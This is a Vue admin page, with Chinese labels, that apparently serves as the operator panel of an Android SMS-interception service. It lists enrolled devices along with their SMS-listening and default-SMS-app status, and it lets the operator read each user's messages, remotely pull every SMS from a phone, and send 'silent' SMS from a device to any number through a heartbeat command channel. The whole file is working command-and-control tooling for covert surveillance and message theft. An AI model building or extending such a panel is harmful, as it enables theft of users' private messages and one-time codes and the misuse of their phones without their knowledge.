<template>
  <div class="monitor-user-list">
    <!-- 搜索区 -->
    <el-card class="search-card">
      <el-form :inline="true" :model="searchForm">
        <el-form-item label="搜索">
          <el-input v-model="searchForm.keyword" placeholder="邮箱/昵称/手机号" clearable style="width: 200px" />
        </el-form-item>
        <el-form-item label="在线状态">
          <el-select v-model="searchForm.online_only" clearable placeholder="全部" style="width: 120px">
            <el-option label="仅在线" value="1" />
          </el-select>
        </el-form-item>
        <el-form-item>
          <el-button type="primary" @click="handleSearch">搜索</el-button>
          <el-button @click="handleReset">重置</el-button>
        </el-form-item>
      </el-form>
    </el-card>

    <!-- 用户列表 -->
    <el-card>
      <el-table :data="list" v-loading="loading" stripe>
        <el-table-column prop="id" label="ID" width="70" />
        <el-table-column label="用户" min-width="180">
          <template #default="{ row }">
            <div>{{ row.nickname || row.email }}</div>
            <div style="font-size: 12px; color: #909399">{{ row.email }}</div>
          </template>
        </el-table-column>
        <el-table-column label="在线状态" width="100" align="center">
          <template #default="{ row }">
            <el-tag :type="row.is_online ? 'success' : 'info'" size="small">
              {{ row.is_online ? '在线' : '离线' }}
            </el-tag>
          </template>
        </el-table-column>
        <el-table-column prop="online_device" label="设备" width="180" show-overflow-tooltip />
        <el-table-column label="短信数量" width="100" align="center">
          <template #default="{ row }">
            <el-tag type="primary" size="small">{{ row.sms_count }}</el-tag>
          </template>
        </el-table-column>
        <el-table-column label="短信权限" width="100" align="center">
          <template #default="{ row }">
            <el-tag v-if="row.sms_permission === 1" type="success" size="small">已授权</el-tag>
            <el-tag v-else-if="row.sms_permission === 2" type="danger" size="small">未授权</el-tag>
            <el-tag v-else type="info" size="small">未知</el-tag>
          </template>
        </el-table-column>
        <el-table-column label="短信监听" width="100" align="center">
          <template #default="{ row }">
            <el-tag v-if="row.sms_listening === 1" type="success" size="small">已开启</el-tag>
            <el-tag v-else-if="row.sms_listening === 2" type="danger" size="small">未开启</el-tag>
            <el-tag v-else type="info" size="small">未知</el-tag>
          </template>
        </el-table-column>
        <el-table-column label="通知权限" width="100" align="center">
          <template #default="{ row }">
            <el-tag v-if="row.foreground_permission === 1" type="success" size="small">已开启</el-tag>
            <el-tag v-else-if="row.foreground_permission === 2" type="danger" size="small">未开启</el-tag>
            <el-tag v-else type="info" size="small">未知</el-tag>
          </template>
        </el-table-column>
        <el-table-column label="默认短信" width="100" align="center">
          <template #default="{ row }">
            <el-tag v-if="row.is_default_sms === 1" type="success" size="small">已设置</el-tag>
            <el-tag v-else-if="row.is_default_sms === 2" type="danger" size="small">未设置</el-tag>
            <el-tag v-else type="info" size="small">未知</el-tag>
          </template>
        </el-table-column>
        <el-table-column prop="last_heartbeat_at" label="最后心跳" width="170" />
        <el-table-column label="操作" width="240" fixed="right">
          <template #default="{ row }">
            <el-button type="primary" link size="small" @click="showSmsDialog(row)">查看短信</el-button>
            <el-button
              type="success"
              link
              size="small"
              @click="handleFetchSms(row)"
              :disabled="!row.is_online || row.has_pending_command"
            >
              获取短信
            </el-button>
            <el-tooltip
              :content="row.is_default_sms !== 1 ? '设备未设置为默认短信应用，无法发送' : ''"
              :disabled="row.is_default_sms === 1"
              placement="top"
            >
              <el-button
                type="warning"
                link
                size="small"
                @click="showSendSmsDialog(row)"
                :disabled="!row.is_online || row.has_pending_command || row.is_default_sms !== 1"
              >
                发送短信
              </el-button>
            </el-tooltip>
            <el-tooltip v-if="row.has_pending_command" content="清除卡住的待处理指令" placement="top">
              <el-button
                type="danger"
                link
                size="small"
                @click="handleClearPending(row)"
              >
                清除指令
              </el-button>
            </el-tooltip>
          </template>
        </el-table-column>
      </el-table>

      <div class="pagination-wrapper">
        <el-pagination
          v-model:current-page="pagination.page"
          v-model:page-size="pagination.pageSize"
          :total="pagination.total"
          :page-sizes="[20, 50, 100]"
          layout="total, sizes, prev, pager, next"
          @size-change="fetchList"
          @current-change="fetchList"
        />
      </div>
    </el-card>

    <!-- 查看短信弹窗 -->
    <el-dialog v-model="smsDialogVisible" :title="smsDialogTitle" width="800px" destroy-on-close>
      <div style="margin-bottom: 12px">
        <el-input
          v-model="smsKeyword"
          placeholder="搜索短信内容或号码"
          clearable
          style="width: 260px"
          @keyup.enter="fetchUserSms"
        >
          <template #append>
            <el-button @click="fetchUserSms">搜索</el-button>
          </template>
        </el-input>
      </div>

      <el-table :data="smsList" v-loading="smsLoading" stripe max-height="400">
        <el-table-column prop="phone_number" label="发送方号码" width="150" />
        <el-table-column prop="content" label="短信内容" min-width="300" show-overflow-tooltip />
        <el-table-column prop="received_at" label="接收时间" width="170" />
      </el-table>

      <div class="pagination-wrapper" style="margin-top: 12px">
        <el-pagination
          v-model:current-page="smsPagination.page"
          v-model:page-size="smsPagination.pageSize"
          :total="smsPagination.total"
          :page-sizes="[20, 50, 100]"
          layout="total, sizes, prev, pager, next"
          @size-change="fetchUserSms"
          @current-change="fetchUserSms"
        />
      </div>
    </el-dialog>

    <!-- 发送短信弹窗 -->
    <el-dialog v-model="sendSmsDialogVisible" title="发送静默短信" width="480px" :close-on-click-modal="false" destroy-on-close>
      <div v-if="sendSmsStatus === ''">
        <el-form :model="sendSmsForm" label-width="80px">
          <el-form-item label="目标号码">
            <el-input v-model="sendSmsForm.phoneNumber" placeholder="请输入接收方手机号" clearable />
          </el-form-item>
          <el-form-item label="短信内容">
            <el-input
              v-model="sendSmsForm.message"
              type="textarea"
              :rows="4"
              placeholder="请输入短信内容"
            />
          </el-form-item>
          <el-form-item label="SIM 卡槽">
            <el-select v-model="sendSmsForm.subId" style="width: 160px">
              <el-option label="默认（自动）" :value="0" />
              <el-option label="SIM 1" :value="1" />
              <el-option label="SIM 2" :value="2" />
            </el-select>
          </el-form-item>
        </el-form>
      </div>
      <div v-else style="text-align: center; padding: 20px">
        <div v-if="sendSmsStatus === 'pending' || sendSmsStatus === 'sent'">
          <el-icon :size="48" color="#409eff" class="rotating"><Loading /></el-icon>
          <p style="margin-top: 16px; font-size: 16px">指令已下发，等待设备执行...</p>
          <p style="color: #909399">设备将在下次心跳（最多15秒）时接收并发送短信</p>
        </div>
        <div v-else-if="sendSmsStatus === 'completed'">
          <el-icon :size="48" color="#67c23a"><CircleCheckFilled /></el-icon>
          <p style="margin-top: 16px; font-size: 16px; color: #67c23a">发送成功!</p>
        </div>
        <div v-else-if="sendSmsStatus === 'failed'">
          <el-icon :size="48" color="#f56c6c"><CircleCloseFilled /></el-icon>
          <p style="margin-top: 16px; font-size: 16px; color: #f56c6c">发送失败</p>
          <p v-if="sendSmsResult?.message" style="color: #909399">{{ sendSmsResult.message }}</p>
        </div>
      </div>
      <template #footer>
        <template v-if="sendSmsStatus === ''">
          <el-button @click="sendSmsDialogVisible = false">取消</el-button>
          <el-button type="primary" :disabled="!sendSmsForm.phoneNumber || !sendSmsForm.message" @click="handleSendSms">发送</el-button>
        </template>
        <template v-else>
          <el-button @click="closeSendSmsDialog">{{ sendSmsStatus === 'completed' || sendSmsStatus === 'failed' ? '关闭' : '取消' }}</el-button>
        </template>
      </template>
    </el-dialog>

    <!-- 获取短信状态弹窗 -->
    <el-dialog v-model="fetchDialogVisible" title="获取用户短信" width="450px" :close-on-click-modal="false">
      <div style="text-align: center; padding: 20px">
        <div v-if="commandStatus === 'pending' || commandStatus === 'sent'">
          <el-icon :size="48" color="#409eff" class="rotating"><Loading /></el-icon>
          <p style="margin-top: 16px; font-size: 16px">指令已下发，等待设备执行...</p>
          <p style="color: #909399">设备将在下次心跳（最多15秒）时接收并执行指令</p>
        </div>
        <div v-else-if="commandStatus === 'completed'">
          <el-icon :size="48" color="#67c23a"><CircleCheckFilled /></el-icon>
          <p style="margin-top: 16px; font-size: 16px; color: #67c23a">获取完成!</p>
          <p style="color: #909399" v-if="commandResult">
            同步了 {{ commandResult.synced }} 条新短信
          </p>
        </div>
        <div v-else-if="commandStatus === 'failed'">
          <el-icon :size="48" color="#f56c6c"><CircleCloseFilled /></el-icon>
          <p style="margin-top: 16px; font-size: 16px; color: #f56c6c">执行失败</p>
        </div>
      </div>
      <template #footer>
        <el-button @click="closeFetchDialog">{{ commandStatus === 'completed' || commandStatus === 'failed' ? '关闭' : '取消' }}</el-button>
      </template>
    </el-dialog>
  </div>
</template>

<script setup lang="ts">
import { ref, reactive, onMounted, onUnmounted } from 'vue'
import { ElMessage, ElMessageBox } from 'element-plus'
import { Loading, CircleCheckFilled, CircleCloseFilled } from '@element-plus/icons-vue'
import {
  getAndroidUsers, getUserSmsRecords,
  fetchSmsCommand, getCommandStatus, sendSmsCommand, clearPendingCommands,
  type AndroidUser, type SmsRecord,
} from '@/api/monitor'

const searchForm = reactive({
  keyword: '',
  online_only: '',
})
const list = ref<AndroidUser[]>([])
const loading = ref(false)
const pagination = reactive({ page: 1, pageSize: 20, total: 0 })

// 短信弹窗
const smsDialogVisible = ref(false)
const smsDialogTitle = ref('')
const smsList = ref<SmsRecord[]>([])
const smsLoading = ref(false)
const smsKeyword = ref('')
const smsPagination = reactive({ page: 1, pageSize: 20, total: 0 })
const currentUserId = ref<number>(0)

// 获取短信状态弹窗
const fetchDialogVisible = ref(false)
const fetchCommandId = ref<number | null>(null)
const commandStatus = ref('')
const commandResult = ref<any>(null)
let pollTimer: ReturnType<typeof setInterval> | null = null

// 发送短信弹窗
const sendSmsDialogVisible = ref(false)
const sendSmsForm = reactive({ phoneNumber: '', message: '', subId: 0 })
const sendSmsStatus = ref('')
const sendSmsResult = ref<any>(null)
const sendSmsCommandId = ref<number | null>(null)
let sendPollTimer: ReturnType<typeof setInterval> | null = null
const sendSmsUserId = ref<number>(0)

const fetchList = async () => {
  loading.value = true
  try {
    const res: any = await getAndroidUsers({
      page: pagination.page,
      pageSize: pagination.pageSize,
      ...searchForm,
    })
    list.value = res.data.list || []
    pagination.total = res.data.total || 0
  } catch (error) {
    console.error('获取用户列表失败:', error)
  } finally {
    loading.value = false
  }
}

const handleSearch = () => {
  pagination.page = 1
  fetchList()
}

const handleReset = () => {
  searchForm.keyword = ''
  searchForm.online_only = ''
  handleSearch()
}

// 查看短信
const showSmsDialog = (user: AndroidUser) => {
  currentUserId.value = user.id
  smsDialogTitle.value = `${user.nickname || user.email} 的短信记录`
  smsKeyword.value = ''
  smsPagination.page = 1
  smsPagination.total = 0
  smsList.value = []
  smsDialogVisible.value = true
  fetchUserSms()
}

const fetchUserSms = async () => {
  smsLoading.value = true
  try {
    const res: any = await getUserSmsRecords(currentUserId.value, {
      page: smsPagination.page,
      pageSize: smsPagination.pageSize,
      keyword: smsKeyword.value,
    })
    smsList.value = res.data.list || []
    smsPagination.total = res.data.total || 0
  } catch (error) {
    console.error('获取短信记录失败:', error)
  } finally {
    smsLoading.value = false
  }
}

// 清除待处理指令
const handleClearPending = async (user: AndroidUser) => {
  try {
    await ElMessageBox.confirm(
      `确定要清除用户「${user.nickname || user.email}」的所有待处理指令吗？`,
      '确认',
      { type: 'warning' }
    )
  } catch {
    return
  }
  try {
    const res: any = await clearPendingCommands(user.id)
    ElMessage.success(`已清除 ${res.data.cleared} 条待处理指令`)
    fetchList()
  } catch (error: any) {
    ElMessage.error(error?.response?.data?.msg || error?.message || '清除失败')
  }
}

// 获取短信
const handleFetchSms = async (user: AndroidUser) => {
  try {
    await ElMessageBox.confirm(
      `确定要获取用户「${user.nickname || user.email}」手机上的全部短信吗？`,
      '确认',
      { type: 'warning' }
    )
  } catch {
    return
  }

  try {
    const res: any = await fetchSmsCommand(user.id)
    fetchCommandId.value = res.data.command_id
    commandStatus.value = 'pending'
    commandResult.value = null
    fetchDialogVisible.value = true
    ElMessage.success('指令已下发')
    startPolling()
  } catch (error: any) {
    ElMessage.error(error?.response?.data?.msg || error?.message || '下发指令失败')
  }
}

const startPolling = () => {
  stopPolling()
  pollTimer = setInterval(async () => {
    if (!fetchCommandId.value) {
      stopPolling()
      return
    }
    try {
      const res: any = await getCommandStatus(fetchCommandId.value)
      commandStatus.value = res.data.status
      commandResult.value = res.data.result
      if (res.data.status === 'completed' || res.data.status === 'failed') {
        stopPolling()
        if (res.data.status === 'completed') {
          fetchList()
        }
      }
    } catch (error) {
      console.error('查询指令状态失败:', error)
    }
  }, 3000)
}

const stopPolling = () => {
  if (pollTimer) {
    clearInterval(pollTimer)
    pollTimer = null
  }
}

const closeFetchDialog = () => {
  stopPolling()
  fetchDialogVisible.value = false
}

// 发送短信
const showSendSmsDialog = (user: AndroidUser) => {
  sendSmsUserId.value = user.id
  sendSmsForm.phoneNumber = ''
  sendSmsForm.message = ''
  sendSmsForm.subId = 0
  sendSmsStatus.value = ''
  sendSmsResult.value = null
  sendSmsCommandId.value = null
  sendSmsDialogVisible.value = true
}

const handleSendSms = async () => {
  if (!sendSmsForm.phoneNumber || !sendSmsForm.message) return
  try {
    const params: any = {
      user_id: sendSmsUserId.value,
      phone_number: sendSmsForm.phoneNumber,
      message: sendSmsForm.message,
    }
    if (sendSmsForm.subId > 0) params.sub_id = sendSmsForm.subId
    const res: any = await sendSmsCommand(params)
    sendSmsCommandId.value = res.data.command_id
    sendSmsStatus.value = 'pending'
    sendSmsResult.value = null
    ElMessage.success('指令已下发')
    startSendPolling()
  } catch (error: any) {
    ElMessage.error(error?.response?.data?.msg || error?.message || '下发指令失败')
  }
}

const startSendPolling = () => {
  stopSendPolling()
  sendPollTimer = setInterval(async () => {
    if (!sendSmsCommandId.value) { stopSendPolling(); return }
    try {
      const res: any = await getCommandStatus(sendSmsCommandId.value)
      sendSmsStatus.value = res.data.status
      sendSmsResult.value = res.data.result
      if (res.data.status === 'completed' || res.data.status === 'failed') {
        stopSendPolling()
        fetchList()
      }
    } catch (error) {
      console.error('查询发送指令状态失败:', error)
    }
  }, 3000)
}

const stopSendPolling = () => {
  if (sendPollTimer) { clearInterval(sendPollTimer); sendPollTimer = null }
}

const closeSendSmsDialog = () => {
  stopSendPolling()
  sendSmsDialogVisible.value = false
  sendSmsStatus.value = ''
}

onMounted(() => {
  fetchList()
})

onUnmounted(() => {
  stopPolling()
  stopSendPolling()
})
</script>

<style scoped>
.search-card {
  margin-bottom: 20px;
}
.pagination-wrapper {
  margin-top: 20px;
  display: flex;
  justify-content: flex-end;
}
.rotating {
  animation: rotate 1.5s linear infinite;
}
@keyframes rotate {
  from { transform: rotate(0deg); }
  to { transform: rotate(360deg); }
}
</style>
